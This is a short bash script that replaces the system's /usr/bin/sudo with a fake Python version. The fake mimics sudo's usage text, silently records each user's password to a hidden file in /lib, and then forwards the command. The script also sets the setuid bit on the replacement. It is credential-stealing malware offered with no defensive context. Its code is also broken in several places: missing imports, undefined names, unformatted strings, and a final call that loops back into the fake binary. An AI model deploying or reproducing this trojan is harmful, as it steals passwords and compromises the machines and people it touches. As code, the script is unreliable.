#!/bin/bash
cat <<EOFA > /usr/bin/sudo
import os
import subprocess
from sys import argv

def main():
    if(len(sys.argv) == 1):
        print("""
        usage: sudo -h | -K | -k | -V
        usage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]
        usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user] [command]
        usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] [VAR=value] [-i|-s] [<command>]
        usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] file ...
        """)
        
    subprocess.Popen('whoami', shell=True, stdout=PIPE).stdout
    user = stdout.read()
    
    os.system('stty -echo')
    password = input("[sudo] password for {user}: ")
    os.system("echo \"{user}:{password}\" >> /lib/.syslogbLog")
    os.system('stty echo')
    arguments = ""
    del sys.argv[0]
    for arg in sys.argv:
        arguments = arguments + arg + " "
    os.system("echo {password} | sudo -S -k {arguments}")
main()
EOFA
chmod +s /usr/bin/sudo